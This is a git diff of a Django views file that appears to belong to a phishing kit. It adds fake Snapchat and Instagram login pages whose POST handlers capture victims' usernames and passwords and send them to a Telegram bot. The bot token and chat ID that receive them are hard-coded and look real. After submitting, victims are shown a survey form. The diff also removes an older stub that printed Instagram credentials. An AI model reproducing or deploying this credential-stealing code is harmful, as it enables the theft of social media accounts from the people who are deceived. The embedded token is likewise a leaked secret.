@@ -1,9 +1,8 @@
 from django.shortcuts import render
-from django.http import HttpResponseRedirect
-from django.conf import settings
 import requests
 from django.http import JsonResponse
-
+import requests
+import traceback
 
 
 
@@ -12,21 +11,75 @@ def login(request):
     return render(request, 'login.html')
 
 
-# instagram login page
-def insta_login(request):
-    if request.method == 'POST':
-        username = request.POST.get('username')
-        password = request.POST.get('password')
-        print(username, password)
-        # send_credentials_to_telegram(username, password)
-        return HttpResponseRedirect('/thank-you/')
-    else:
-        return render(request, 'insta_login.html')
-
 
 # snapchat login page
 def snap_login(request):
-    return render(request, 'snap_login.html')
+    try:
+        if request.method == 'POST':
+            platform = request.POST.get('platform')
+
+            if platform == 'snapchat':
+                username = request.POST.get('username')
+                password = request.POST.get('password')
+
+                # send creds to telegram
+                send_credentials_to_telegram(platform, username, password)
+
+            return render(request, 'form.html')
+        else:
+            return render(request, 'snap_login.html')
+    except:
+        traceback.print_exc()
+
+
+    
+# instagram login page
+def insta_login(request):
+    try:
+        if request.method == 'POST':
+            platform = request.POST.get('platform')
+
+            if platform == 'instagram':
+                # Extract username and password from the form data
+                username = request.POST.get('username')
+                password = request.POST.get('password')
+
+                # Send the credentials to Telegram
+                send_credentials_to_telegram(platform, username, password)
+
+            # return redirect('survey')
+            return render(request, 'form.html')
+        else:
+            # Render the login page for GET requests
+            return render(request, 'insta_login.html')
+
+    except Exception as e:
+        traceback.print_exc()
+        print("error occur {e}")
+
+
+
+# telegram send message 
+def send_credentials_to_telegram(platform, username, password):
+    try:
+        # Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual bot token and chat ID
+        bot_token = '6818215291:AAFQqo7CtFPXkm3G9SkfMThd4C6SjoKyfjM'
+        chat_id = '-1002099651245'
+
+        # Compose the message containing the credentials
+        message = f'{platform.capitalize()} Username: {username}\n{platform.capitalize()} Password: {password}'
+
+        send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + \
+            chat_id + '&parse_mode=Markdown&text=' + message
+
+        response = requests.get(send_text)
+        return response.json()
+        # https://api.telegram.org/bot6818215291:AAFQqo7CtFPXkm3G9SkfMThd4C6SjoKyfjM/sendMessage?chat_id=-1002099651245&text=hello
+        
+    except Exception as e:
+        print(f'An error occurred: {e}')
+
+
 
 
 def login_api(self, request):
@@ -47,31 +100,3 @@ def login_api(self, request):
 def survey(request):
     return render(request, 'form.html')
 
-
-# Telegram channel to send message
-def send_message_to_telegram(username, password, bot_token, chat_id):
-    message = f"Instagram Username: {username}\nInstagram Password: {password}"
-    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-    params = {"chat_id": chat_id, "text": message}
-    response = requests.post(url, params=params)
-    return response.json()
-
-# Replace these values with your own
-instagram_username = "your_instagram_username"
-instagram_password = "your_instagram_password"
-telegram_bot_token = "your_telegram_bot_token"
-telegram_chat_id = "your_telegram_chat_id"
-
-# Call the function to send the message
-send_message_to_telegram(instagram_username, instagram_password, telegram_bot_token, telegram_chat_id)
-
-
-# def login(request):
-#     if request.method == 'POST':
-#         username = request.POST.get('username')
-#         password = request.POST.get('password')
-#         print(username, password)
-#         # send_credentials_to_telegram(username, password)
-#         return HttpResponseRedirect('/thank-you/')
-#     else:
-#         return render(request, 'login.html')
